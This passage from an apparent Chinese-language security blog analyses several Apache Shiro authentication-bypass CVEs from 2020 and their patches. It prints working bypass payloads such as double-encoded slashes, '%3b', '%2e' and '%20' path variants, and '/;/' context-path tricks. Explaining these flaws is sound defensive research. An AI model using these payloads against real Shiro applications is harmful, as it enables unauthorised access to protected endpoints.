+<pre class="language-txt" data-language="txt"><code class="language-txt">http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;audit&#x2F;&#x2F;;aaaa&#x2F;;...&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;;&#x2F;;&#x2F;;awdwadwa&#x2F;list</code></pre>
+
+<h3 id="漏洞修复-4"><a href="#漏洞修复-4" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>首先是针对 <a target="_blank" rel="noopener" href="https://issues.apache.org/jira/browse/SHIRO-682">SHIRO-682</a> 的修复，共提交了两次，第一次为 <a target="_blank" rel="noopener" href="https://github.com/apache/shiro/commit/589f10d40414a815dbcaf1f1500a51f41258ef70">Commit-589f10d</a> ，如下图，可以看到是在 <code>PathMatchingFilter#pathsMatch</code> 方法中添加了对访问路径后缀为 &quot;/&quot; 的支持。</p>
+<p><img src="https://su18.org/post-images/1642063615932.png" alt="img"></p>
+<p>同时在 <code>PathMatchingFilterChainResolver#getChain</code> 也添加了同样的逻辑。</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/1642063507064.png" alt="img"></p>
+<p>第二次是 <a target="_blank" rel="noopener" href="https://github.com/apache/shiro/commit/9762f97926ba99ac0d958e088cae3be8b657948d">Commit-9762f97</a>，是修复由于上一次提交，导致访问路径为 &quot;/&quot; 时抛出的异常。可以看到除了 <code>endsWith</code> 还添加了 <code>equals</code> 的判断。</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/1642089975752.png" alt="img"></p>
+<p>然后是对使用 &quot;;&quot; 绕过的修复 <a target="_blank" rel="noopener" href="https://github.com/apache/shiro/commit/3708d7907016bf2fa12691dff6ff0def1249b8ce">Commit-3708d79</a>， 可以看到 shiro 不再使用 <code>request.getRequestURI()</code> 来获取用户妖魔鬼怪的请求路径，而是使用 <code>request.getContextPath()</code>、<code>request.getServletPath()</code>、<code>request.getPathInfo()</code> 进行拼接，直接获取中间件处理后的内容。</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/1642063523718.png" alt="img"></p>
+<h2 id="CVE-2020-11989"><a href="#CVE-2020-11989" class="headerlink" title="CVE-2020-11989"></a>CVE-2020-11989</h2><h3 id="漏洞信息-6"><a href="#漏洞信息-6" class="headerlink" title="漏洞信息"></a>漏洞信息</h3><table>
+<thead>
+<tr>
+<th align="left">漏洞信息</th>
+<th align="left">详情</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">漏洞编号</td>
+<td align="left"><a target="_blank" rel="noopener" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-11989">CVE-2020-11989</a> / <a target="_blank" rel="noopener" href="https://issues.apache.org/jira/browse/SHIRO-782">SHIRO-782</a></td>
+</tr>
+<tr>
+<td align="left">影响版本</td>
+<td align="left">shiro &lt; 1.5.3</td>
+</tr>
+<tr>
+<td align="left">漏洞描述</td>
+<td align="left">由安全研究员 Ruilin 以及淚笑发现在 Apache Shiro 1.5.3 之前的版本， 将 Apache Shiro 与 Spring 动态控制器一起使用时，特制请求可能会导致身份验证绕过。</td>
+</tr>
+<tr>
+<td align="left">漏洞关键字</td>
+<td align="left">Spring | 双重编码 | %25%32%66 | 绕过 | context-path | /;/</td>
+</tr>
+<tr>
+<td align="left">漏洞补丁</td>
+<td align="left"><a target="_blank" rel="noopener" href="https://github.com/apache/shiro/commit/01887f645f92d276bbaf7dc644ad28ed4e82ef02">Commit-01887f6</a></td>
+</tr>
+<tr>
+<td align="left">相关链接</td>
+<td align="left"><a target="_blank" rel="noopener" href="https://xlab.tencent.com/cn/2020/06/30/xlab-20-002/">https://xlab.tencent.com/cn/2020/06/30/xlab-20-002/</a> <a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/yb6Tb7zSTKKmBlcNVz0MBA">https://mp.weixin.qq.com/s/yb6Tb7zSTKKmBlcNVz0MBA</a></td>
+</tr>
+</tbody></table>
+<h3 id="漏洞详解-5"><a href="#漏洞详解-5" class="headerlink" title="漏洞详解"></a>漏洞详解</h3><h4 id="AntPathMatcher-绕过"><a href="#AntPathMatcher-绕过" class="headerlink" title="AntPathMatcher 绕过"></a>AntPathMatcher 绕过</h4><p>根据腾讯玄武实验室官方给出的漏洞细节文章，本漏洞是需要几个利用条件的，接下来看一下具体的细节。</p>
+<p>Shiro 支持 <a target="_blank" rel="noopener" href="https://ant.apache.org/">Ant</a> 风格的路径表达式配置。ANT 通配符有 3 种，如下表：</p>
+<table>
+<thead>
+<tr>
+<th align="center">通配符</th>
+<th align="center">说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">?</td>
+<td align="center">匹配任何单字符</td>
+</tr>
+<tr>
+<td align="center">*</td>
+<td align="center">匹配0或者任意数量的字符</td>
+</tr>
+<tr>
+<td align="center">**</td>
+<td align="center">匹配0或者更多的目录</td>
+</tr>
+</tbody></table>
+<p>在之前的测试和使用中，常见的就是 <code>/**</code> 之类的配置，匹配路径下的全部访问请求，包括子目录及后面的请求，如：<code>/admin/**</code> 可以匹配 <code>/admin/list</code> 以及 <code>/admin/get/id/2</code> 等请求。</p>
+<p>另外一个类似的配置是 <code>/*</code> ，单个 <code>*</code> 不能跨目录，只能在两个 <code>/</code> 之间匹配任意数量的字符，如 <code>/admin/*</code> 可以匹配 <code>/admin/list</code> 但是不能匹配 <code>/admin/get/id/2</code>。</p>
+<p>Shiro 对于 Ant 风格路径表达式解析的支持位于 <code>AntPathMatcher#doMatch</code> 方法中，这里简单说一下其中的逻辑：</p>
+<p>首先判断配置的表达式 pattern 和访问路径 path 起始是否均为 <code>/</code> 或均不是，如果不同则直接返回 false。</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/1642996128791.png" alt="img"></p>
+<p>然后将 pattern 和 path 均切分为 String 类型的数组。</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/1642996235532.png" alt="img"></p>
+<p>然后开始循环判断 pattern 和 path 对应位置的配置和路径是否有匹配，判断使用 <code>AntPathMatcher#matchStrings</code> 方法。</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/1642996454160.png" alt="img"></p>
+<p><code>AntPathMatcher#matchStrings</code> 方法又把字符拆分成 char 数组，来进行匹配尝试，并支持 <code>*</code> 以及 <code>?</code> 类型的通配符的匹配。</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/1642996917256.png" alt="img"></p>
+<p>本次漏洞涉及到的配置则是使用 <code>*</code> 配置。再再次重温一下 shiro 的处理逻辑：</p>
+<p><code>WebUtils#getRequestUri</code> 方法使用 <code>request.getContextPath()/request.getServletPath()/request.getPathInfo()</code> 获取用户请求路径，然后调用 <code>decodeAndCleanUriString</code> 方法解码并取出 <code>;</code> 之后的内容，然后调用 normalize 标准化路径。</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/1643002359360.png" alt="img"></p>
+<p><code>decodeAndCleanUriString</code> 方法逻辑之前贴过，这里再贴一次。</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/1643002184283.png" alt="img"></p>
+<p>而漏洞就出在此逻辑处，各位看官集中注意力，我来描述一下：</p>
+<ul>
+<li>以前的 shiro 使用 <code>request.getRequestURI()</code> 获取用户请求路径，并自行处理，此时 shiro 默认Servlet 容器（中间件）不会对路径进行 URL 解码操作，通过其注释可以看到；<br><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/1643003287277.png" alt="img"></li>
+<li>在 1.5.2 版本的 shiro 更新中，为了修复 CVE-2020-1957 ，将 <code>request.getRequestURI()</code> 置换为了 <code>valueOrEmpty(request.getContextPath()) + &quot;/&quot; + valueOrEmpty(request.getServletPath()) + valueOrEmpty(request.getPathInfo());</code>，而对于 <code>request.getContextPath()</code> 以及 <code>request.getPathInfo()</code>，以 Tomcat 为例的中间件是会对其进行 URL 解码操作的，此时 shiro 再进行 <code>decodeAndCleanUriString</code>，就相当于进行了两次的 URL 解码，而与之后的 Spring 的相关处理产生了差异。</li>
+</ul>
+<p>这其中细节，可以查看 mi1k7ea 师傅发表在先知上的<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7544">文章</a>，我这里截取其中的一小段。</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/1643003877308.png" alt="img"></p>
+<p>至此已经发现了 shiro 中的路径处理差异问题，由于 shiro 会二次解码路径，因此 <code>%25%32%66</code> 将会被 shiro 解码为 <code>/</code>，而如果只解码一次， <code>%25%32%66</code> 只会被处理成 <code>%2f</code>。</p>
+<p>此时如果使用了单个 &quot;*&quot; 的通配符，将产生差异化问题，例如如下配置，配置了 <code>/audit/*</code>：</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/1643004321211.png" alt="img"></p>
+<p>此时访问 <code>/audit/list</code>，<code>/audit/aaa</code> 之类的请求，都会被 shiro 拦截，需要进行权限校验。</p>
+<p>但是如果访问 <code>/audit/aa%25%32%66a</code>，在 shiro 处理时，会将其处理为 <code>/audit/aa/a</code>，此路径并不能被 <code>/audit/*</code> 配置项匹配到，因此会绕过 shiro 校验。而在后续 spring 逻辑中会处理成 <code>/audit/aa%2fa</code>，可能会绕过请求。</p>
+<p>找到了差异点，接下来就要找场景了，Ruil1n 师傅找到了当 Spring 在参数中使用 <code>PathVariable</code> 注解从 RequestMapping 中的占位符中取数据的场景，可以满足上面的情况，如下图：</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/1643007755058.png" alt="img"></p>
+<p>漏洞复现如下，正常访问：<code>/audit/aaaa</code> 会跳转至登录页面：</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/1643009508411.png" alt="img"></p>
+<p>使用 <code>%25%32%66</code> 绕过，可以发现绕过：</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/1643009611555.png" alt="img"></p>
+<p>这里还有一个限制，由 PathVariable 注解的参数只能是 String 类型，如果是其他类型的参数，将会由于类型不匹配而无法找到对应的处理方法。</p>
+<h4 id="ContextPath-绕过"><a href="#ContextPath-绕过" class="headerlink" title="ContextPath 绕过"></a>ContextPath 绕过</h4><p>这个绕过实际上是对上一个 CVE 思路上的延伸，在 CVE-2020-1957 中，借助了 shiro 和 spring 在获取 requestURI 时对 <code>;</code> 的处理差异，以及 <code>/../</code> 在路径标准化中的应用，进行了权限绕过。</p>
+<p>而这次的绕过，则是在 ContextPath 之前使用 <code>/;/</code> 来绕过，访问如：<code>/;/spring/admin/aaa</code> 路径，根据已经了解到的知识：</p>
+<ul>
+<li>shiro 会截取掉 <code>;</code> 之后的路径，按照 <code>/</code> 来匹配；</li>
+<li>spring 会把路径标准化为 <code>/spring/admin/aaa</code> 来匹配。</li>
+</ul>
+<p>这就产生了 shiro 鉴权的路径和 spring 处理的路径不同造成的绕过。</p>
+<p>淚笑提供了他的<a target="_blank" rel="noopener" href="https://github.com/l3yx/springboot-shiro">漏洞环境</a>。复现如下：</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/1643016729873.png" alt="img"></p>
+<p>同样，上面这个 payload 只能在较低版本的 Spring Boot 上使用，原因与之前提到过的一致。</p>
+<h3 id="漏洞修复-5"><a href="#漏洞修复-5" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>Shiro 在 <a target="_blank" rel="noopener" href="https://github.com/apache/shiro/commit/01887f645f92d276bbaf7dc644ad28ed4e82ef02">Commit-01887f6</a> 中提交了针对上述两个绕过的更新。</p>
+<p>首先 shiro 回退了 <code>WebUtils#getRequestUri</code> 的代码，并将其标记为 <code>@Deprecated</code>。并建议使用 <code>getPathWithinApplication()</code> 方法获取路径减去上下文路径，或直接调用 <code>HttpServletRequest.getRequestURI()</code> 方法获取。</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/1643018792706.png" alt="img"></p>
+<p>其次是在 <code>WebUtils#getPathWithinApplication</code> 方法，修改了使用 RequestUri 去除 ContextPath 的减法思路，改为使用 servletPath + pathInfo 的加法思路。加法过后使用 <code>removeSemicolon</code> 方法处理分号，<code>normalize</code> 方法标准化路径。</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/1643019122710.png" alt="img"></p>
+<p><code>getServletPath</code> 和 <code>getPathInfo</code> 方法逻辑如下：</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/1643019260964.png" alt="img"></p>
+<p>更新后，shiro 不再处理 contextPath，不会导致绕过，同时也避免了二次 URL 解码的问题。</p>
+<h2 id="CVE-2020-13933"><a href="#CVE-2020-13933" class="headerlink" title="CVE-2020-13933"></a>CVE-2020-13933</h2><h3 id="漏洞信息-7"><a href="#漏洞信息-7" class="headerlink" title="漏洞信息"></a>漏洞信息</h3><table>
+<thead>
+<tr>
+<th align="left">漏洞信息</th>
+<th align="left">详情</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">漏洞编号</td>
+<td align="left"><a target="_blank" rel="noopener" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-13933">CVE-2020-13933</a> / <a target="_blank" rel="noopener" href="https://www.cnvd.org.cn/flaw/show/CNVD-2020-46579">CNVD-2020-46579</a></td>
+</tr>
+<tr>
+<td align="left">影响版本</td>
+<td align="left">shiro &lt; 1.6.0</td>
+</tr>
+<tr>
+<td align="left">漏洞描述</td>
+<td align="left">Apache Shiro 由于处理身份验证请求时存在权限绕过漏洞，远程攻击者可以发送特制的 HTTP请求，绕过身份验证过程并获得对应用程序的未授权访问。</td>
+</tr>
+<tr>
+<td align="left">漏洞关键字</td>
+<td align="left">Spring | 顺序 | %3b | 绕过</td>
+</tr>
+<tr>
+<td align="left">漏洞补丁</td>
+<td align="left"><a target="_blank" rel="noopener" href="https://github.com/apache/shiro/commit/dc194fc977ab6cfbf3c1ecb085e2bac5db14af6d">Commit-dc194fc</a></td>
+</tr>
+<tr>
+<td align="left">相关链接</td>
+<td align="left"><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8223">https://xz.aliyun.com/t/8223</a></td>
+</tr>
+</tbody></table>
+<h3 id="漏洞详解-6"><a href="#漏洞详解-6" class="headerlink" title="漏洞详解"></a>漏洞详解</h3><p>这个 CVE 实际上是对上一个 CVE 中 AntPathMatcher 绕过方式的再次绕过。</p>
+<p>在上一个 CVE 的修复补丁中提到，Shiro 使用了 servletPath + pathInfo 的加法思路获取访问 URI。获取两者值的方法均为从 attribute 中获得对应的值，如果为空则调用 <code>request.getXX</code> 对应的方法进行获取，加法过后使用 <code>removeSemicolon</code> 方法处理分号，<code>normalize</code> 方法标准化路径。之前也提到过，<code>request.getXX</code> 方法，会进行 URL 解码操作。</p>
+<p>这里需要注意的是处理顺序的问题，按照上述逻辑，shiro 对于路径的处理，会先 URL 解码，再处理分号，然后标准化路径。</p>
+<p>这个顺序将会与 Spring 及 Tomcat 产生差异，之前提到过，在 <code>UrlPathHelper#decodeAndCleanUriString</code> 方法中，是后两者是先处理分号，再 URL 解码，然后标准化路径。</p>
+<p>这一差异将会导致，当请求中出现了 <code>;</code> 的 URL 编码 <code>%3b</code> 时，处理顺序的不同将会带来结果不同导致绕过：</p>
+<ul>
+<li>shiro 会 url 解码成 <code>;</code>，然后截断后面的内容，进行匹配，例如 <code>/audit/aaa%3baaa</code> -&gt; <code>/audit/aaa</code>。</li>
+<li>spring &amp; tomcat 会处理成 <code>/audit/aaa;aaa</code>。</li>
+</ul>
+<p>两者处理后的结果不同，就造成了绕过。差异点找到了，接下来就是场景，也同样依赖 <code>PathVariable</code> 注解 String 类型的参数。</p>
+<p>这里有一个点是，对于使用了 <code>/audit/*</code> 配置的鉴权，无法是匹配 <code>/audit/</code> 的。</p>
+<p>因此，对于配置了 <code>/audit/*</code> 的鉴权，可以使用 <code>/audit/%3baaa</code> 来使 shiro 处理成 <code>/audit/</code>，并结合在 spring 中 PathVariable 的场景即可实现绕过。</p>
+<p>漏洞复现如下：</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/1643036234269.png" alt="img"></p>
+<h3 id="漏洞修复-6"><a href="#漏洞修复-6" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>本次漏洞修复位于 <a target="_blank" rel="noopener" href="https://github.com/apache/shiro/commit/dc194fc977ab6cfbf3c1ecb085e2bac5db14af6d">Commit-dc194fc</a> 中，在这此更新中，shiro 没有改动现有的处理逻辑，而是选择了使用全局过滤和处理的方式。</p>
+<p>Shiro 创建了一个 global 的 filter：<code>InvalidRequestFilter</code>，这个类继承了 <code>AccessControlFilter</code>。用来过滤和阻断有危害的请求，会返回 400 状态码，其中包括：</p>
+<ul>
+<li>带有分号的请求；</li>
+<li>带有反斜线的请求；</li>
+<li>非 ASCII 字符。</li>
+</ul>
+<p>这个类是根据 spring-security 中的 <a target="_blank" rel="noopener" href="https://docs.spring.io/spring-security/site/docs/current/api/org/springframework/security/web/firewall/StrictHttpFirewall.html">StrictHttpFirewall</a> 类编写而来。</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/1643077038950.png" alt="img"></p>
+<p>其中关键的 <code>isAccessAllowed</code> 方法会进行逐个校验。</p>
+<p>shiro 将 <code>InvalidRequestFilter</code> 配置在 Global Filter 中。</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/1643078412941.png" alt="img"></p>
+<p>并使其默认匹配 &quot;/**&quot;，使其可以全局匹配进行过滤校验。</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/1643079290890.png" alt="img"></p>
+<h2 id="CVE-2020-17510"><a href="#CVE-2020-17510" class="headerlink" title="CVE-2020-17510"></a>CVE-2020-17510</h2><h3 id="漏洞信息-8"><a href="#漏洞信息-8" class="headerlink" title="漏洞信息"></a>漏洞信息</h3><table>
+<thead>
+<tr>
+<th align="left">漏洞信息</th>
+<th align="left">详情</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">漏洞编号</td>
+<td align="left"><a target="_blank" rel="noopener" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-17510">CVE-2020-17510</a> / <a target="_blank" rel="noopener" href="https://www.cnvd.org.cn/flaw/show/CNVD-2020-60318">CNVD-2020-60318</a></td>
+</tr>
+<tr>
+<td align="left">影响版本</td>
+<td align="left">shiro &lt; 1.7.0</td>
+</tr>
+<tr>
+<td align="left">漏洞描述</td>
+<td align="left">Apache Shiro 由于处理身份验证请求时存在权限绕过漏洞，远程攻击者可以发送特制的 HTTP请求，绕过身份验证过程并获得对应用程序的未授权访问。</td>
+</tr>
+<tr>
+<td align="left">漏洞关键字</td>
+<td align="left">Spring | 编码 | %2e | 绕过 | /%2e%2e/</td>
+</tr>
+<tr>
+<td align="left">漏洞补丁</td>
+<td align="left"><a target="_blank" rel="noopener" href="https://github.com/apache/shiro/commit/6acaaee9bb3a27927b599c37fabaeb7dd6109403">Commit-6acaaee</a></td>
+</tr>
+<tr>
+<td align="left">相关链接</td>
+<td align="left"><a target="_blank" rel="noopener" href="https://lists.apache.org/thread/12bn9ysx6ogm830stywro4pkoq8dxzfk">https://lists.apache.org/thread/12bn9ysx6ogm830stywro4pkoq8dxzfk</a></td>
+</tr>
+</tbody></table>
+<h3 id="漏洞详解-7"><a href="#漏洞详解-7" class="headerlink" title="漏洞详解"></a>漏洞详解</h3><p>本漏洞还是对 AntPathMatcher 的继续绕过。之前已经尝试了 <code>;</code> 的 URL 编码，<code>/</code> 的双重 URL 编码的绕过，都是因为 Shiro 先 url 解码再标准化和处理的逻辑与 Spring 不同导致的。</p>
+<p>那还有什么字符的 URL 编码可能导致问题呢？常见的 URL 中还有什么字符能用呢？答案就是 <code>.</code>，<code>.</code> 的 URL 编码为 <code>%2e</code>。</p>
+<p>当一个 <code>%2e</code> 出现在请求中时，会发生什么事呢？很显然，shiro 会将其当做 <code>.</code> 处理，而 Spring 会将其当做字符 <code>%2e</code> 处理。</p>
+<p>此时如果 <code>%2e</code> 出现的位置正确，就可以在 shiro 处理后消失，造成差异，例如访问：&quot;/audit/%2e/&quot;：</p>
+<ul>
+<li>Shiro url decode：&quot;/audit/./&quot;</li>
+<li>Shiro 标准化路径：&quot;/audit/&quot;</li>
+<li>Spring 标准化路径：&quot;/audit/%2e/&quot;</li>
+<li>Spring url decode：&quot;/audit/.&quot;</li>
+</ul>
+<p>由此可见，Shiro 匹配的路径和 Spring 匹配的路径相差了一个字符 &quot;.&quot;，将造成绕过。此时依旧借助单个 &quot;*&quot; 的通配符以及 <code>PathVariable</code> 注解 String 类型的参数的场景触发漏洞。</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/1643104107679.png" alt="img"></p>
+<p>可以使用的 payload 包括：</p>
+<ul>
+<li><code>/%2e</code></li>
+<li><code>/%2e/</code></li>
+<li><code>/%2e%2e</code></li>
+<li><code>/%2e%2e/</code></li>
+</ul>
+<p>因为上面的写法都会被 shiro 的标准化路径处理掉，并且同时能被 <code>PathVariable</code> 注解 String 类型的参数匹配到。</p>
+<h3 id="漏洞修复-7"><a href="#漏洞修复-7" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>Shiro 在 <a target="_blank" rel="noopener" href="https://github.com/apache/shiro/commit/6acaaee9bb3a27927b599c37fabaeb7dd6109403">Commit-6acaaee</a> 中提交了本次漏洞的修复。</p>
+<p>在本次修复中可以看到，Shiro 的思路再次转变，不再按照 Spring 和 Tomcat 改自己的处理代码，也不再给自己加代码来适配 Spring，而是创建了 UrlPathHelper 的子类 ShiroUrlPathHelper，并重写了 <code>getPathWithinApplication</code> 和 <code>getPathWithinServletMapping</code> 两个方法，全部使用 Shiro 自己的逻辑 <code>WebUtils#getPathWithinApplication</code> 进行返回。</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/1643097638169.png" alt="img"></p>
+<p>在之前的分析中我们知道，Spring 与 Shiro 处理逻辑之间的差异就在这个位置，而现在 Shiro 直接把代码逻辑重写，通过注入自己的代码来修改 Spring 的相关逻辑，用来保证二者没有差异。究竟是怎么注入的呢？在配置类中 import 了 <code>ShiroRequestMappingConfig</code> 类。</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/1643097999114.png" alt="img"></p>
+<p><code>ShiroRequestMappingConfig</code> 类会向 <code>RequestMappingHandlerMapping#urlPathHelper</code> 设置为 <code>ShiroUrlPathHelper</code>。</p>
+<p><img src="https://su18.org/post-images/1643098610269.png" alt="img"></p>
+<p>设置后，Spring 匹配 handler 时获取路径的逻辑就会使用 Shiro 提供的逻辑，保持了二者逻辑的一致。从而避免了绕过的情况。</p>
+<h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><p>这里需要注意的是，Shiro 官方对这个漏洞的修复非常坑，根据官方给出的<a target="_blank" rel="noopener" href="https://lists.apache.org/thread/12bn9ysx6ogm830stywro4pkoq8dxzfk">信息</a>，Shiro 将修复放在了 <code>shiro-spring-boot-web-starter</code> 包中，也就是使用了 <code>shiro-spring-boot-web-starter</code> 进行配置的项目，升级版本才会使防御代码生效，才会注入 ShiroUrlPathHelper 。</p>
+<p>如果你没有使用<code>shiro-spring-boot-web-starter</code> 自动配置，而是引入 <code>shiro-spring</code> 自己进行注入 Bean，单纯的升级版本是无法防御本次 CVE 的，需要：</p>
+<ol>
+<li>根据<a target="_blank" rel="noopener" href="https://github.com/apache/shiro/blob/shiro-root-1.7.0/support/spring/src/main/java/org/apache/shiro/spring/web/config/ShiroRequestMappingConfig.java#L28-L30">这个链接</a>中的代码来进行手动配置；</li>
+<li>或根据<a target="_blank" rel="noopener" href="https://shiro.apache.org/spring-framework.html#SpringFramework-WebConfig">这个链接</a>将 <code>ShiroRequestMappingConfig</code> 添加在 auto configuration 配置中。</li>
+</ol>
+<p>如果不配置，将无法有效防御此 CVE。</p>
+<h3 id="绕过-1"><a href="#绕过-1" class="headerlink" title="绕过"></a>绕过</h3><p>这个修复在当时来看，如果配置正确，防御能力是 OK 的，整个思路都没问题，但是随着 Spring 自身代码的迭代，却又将安全问题暴露了出来。在高版本的 Spring 中，由于 <code>alwaysUseFullPath</code> 默认为 true ，导致应用程序使用 <code>UrlPathHelper.defaultInstance</code> 来处理，而不是 Shiro 实现的 <code>ShiroUrlPathHelper</code> 来处理。</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/1643096936792.png" alt="img"></p>
+<p>这样就导致这个修复补丁又被完美的绕过了。</p>
+<p><img src="https://su18.org/post-images/1643097189106.png" alt="img"></p>
+<h2 id="CVE-2020-17523"><a href="#CVE-2020-17523" class="headerlink" title="CVE-2020-17523"></a>CVE-2020-17523</h2><h3 id="漏洞信息-9"><a href="#漏洞信息-9" class="headerlink" title="漏洞信息"></a>漏洞信息</h3><table>
+<thead>
+<tr>
+<th align="left">漏洞信息</th>
+<th align="left">详情</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">漏洞编号</td>
+<td align="left"><a target="_blank" rel="noopener" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-17523">CVE-2020-17523</a> / <a target="_blank" rel="noopener" href="https://www.cnvd.org.cn/flaw/show/CNVD-2021-09492">CNVD-2021-09492</a></td>
+</tr>
+<tr>
+<td align="left">影响版本</td>
+<td align="left">shiro &lt; 1.7.1</td>
+</tr>
+<tr>
+<td align="left">漏洞描述</td>
+<td align="left">Apache Shiro 由于处理身份验证请求时存在权限绕过漏洞，远程攻击者可以发送特制的 HTTP请求，绕过身份验证过程并获得对应用程序的未授权访问。</td>
+</tr>
+<tr>
+<td align="left">漏洞关键字</td>
+<td align="left">Spring | trim | %20 | 绕过 | /%20%20/</td>
+</tr>
+<tr>
+<td align="left">漏洞补丁</td>
+<td align="left"><a target="_blank" rel="noopener" href="https://github.com/apache/shiro/commit/ab1ea4a2006f6bd6a2b5f72740b7135662f8f160">Commit-ab1ea4a</a></td>
+</tr>
+<tr>
+<td align="left">相关链接</td>
+<td align="left"><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/230935">https://www.anquanke.com/post/id/230935</a> <a target="_blank" rel="noopener" href="https://www.eso.org/~ndelmott/url_encode.html">https://www.eso.org/~ndelmott/url_encode.html</a></td>
+</tr>
+</tbody></table>
+<h3 id="漏洞详解-8"><a href="#漏洞详解-8" class="headerlink" title="漏洞详解"></a>漏洞详解</h3><p>继续绕过...</p>
+<p>在使用 <code>.</code> 、<code>/</code> 、<code>;</code> 的 URL 编码绕过之后，这次使用的是空格的 URL 编码：<code>%20</code>。</p>
+<p>之前讲过，在匹配访问路径与配置鉴权路径时，在 <code>AntPathMatcher#doMatch</code> 方法中，首先会调用 <code>org.apache.shiro.util.StringUtils#tokenizeToStringArray</code> 方法将 pattern 以及 path 处理成 String 数组，再进行比对。</p>
+<p><img src="https://su18.org/post-images/1643108121514.png" alt="img"></p>
+<p>这个方法会继续调用有四个参数的重写方法，并且后两个参数的值均为 true。其实这部分也是抄的 spring 的代码。</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/1643108220835.png" alt="img"></p>
+<p>可以看到后两个布尔类型参数的意义是对 StringTokenizer 结果的处理的标志 flag，代表是否对 token 进行 trim 操作，以及是否忽略空的 token。</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/1643108468671.png" alt="img"></p>
+<p>因此，在被 <code>WebUtils#getPathWithinApplication</code> 方法处理过的 URI，再与配置路径匹配时，又会处理空格。</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/1643108941676.png" alt="img"></p>
+<p>因此对于 &quot;/audit/%20&quot; 这种访问，可以理解为会被 shiro 处理成 &quot;/audit/&quot; 这种格式去匹配。</p>
+<p>而 Spring 的处理逻辑，在配置了 CVE-2020-17510 的安全补丁后，虽然与 shiro 保持了一致，但是在匹配 handler 时并没有空格的处理，因此可以继续以字符串的方式匹配。</p>
+<p>依旧是依赖单个 &quot;*&quot; 的通配符以及 <code>PathVariable</code> 注解 String 类型的参数的场景触发漏洞。复现如下，<code>%20</code> 随便加。</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/1643109660920.png" alt="img"></p>
+<p>由于之前的安全修复，URL 中的非 ASCII 字符会被 filter 干掉，因此，我 FUZZ 了<br>%00-ff 的全部字符，发现只有 %20 能用。<br><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/1643167384780.png" alt="img"></p>
+<h3 id="漏洞修复-8"><a href="#漏洞修复-8" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>Shiro 在 <a target="_blank" rel="noopener" href="https://github.com/apache/shiro/commit/ab1ea4a2006f6bd6a2b5f72740b7135662f8f160">Commit-ab1ea4a</a> 中提交了本次漏洞的修复。</p>
+<p>可以看到是指定了 <code>StringUtils#tokenizeToStringArray</code> 方法的第三个参数 trimTokens 为 false，也就是说不再去除空格，从而消除了本次漏洞的影响。</p>
